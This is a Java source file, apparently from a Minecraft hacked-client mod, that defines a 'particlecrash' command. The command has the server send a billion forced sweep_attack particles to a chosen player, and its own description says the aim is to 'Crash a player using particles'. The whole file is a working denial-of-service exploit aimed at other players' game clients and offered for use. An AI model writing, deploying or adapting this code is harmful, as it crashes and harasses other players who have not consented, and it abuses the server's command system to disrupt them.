package net.como.client.commands.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.como.client.ComoClient;
import net.como.client.commands.Command;
import net.como.client.commands.arguments.PlayerArgumentType;
import net.minecraft.command.CommandSource;
import net.minecraft.entity.player.PlayerEntity;

public class ParticleCrash extends Command {
    final private long PARTICLE_COUNT = (long)Math.pow(10, 9); // 10^9

    public ParticleCrash() {
        super("particlecrash", "Crash a player using particles");
    }

    private void perform(String name) {
        String cmd = String.format("particle sweep_attack ~ ~ ~ ~ ~ ~ 40 %d force %s", PARTICLE_COUNT, name);

        ComoClient.getInstance().getClient().getNetworkHandler().sendCommand(cmd);
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(argument("player", PlayerArgumentType.create()).executes(context -> {
            PlayerEntity player = PlayerArgumentType.get(context, "player");
            perform(player.getDisplayName().getString());
            return 1;
        }));
    }
}
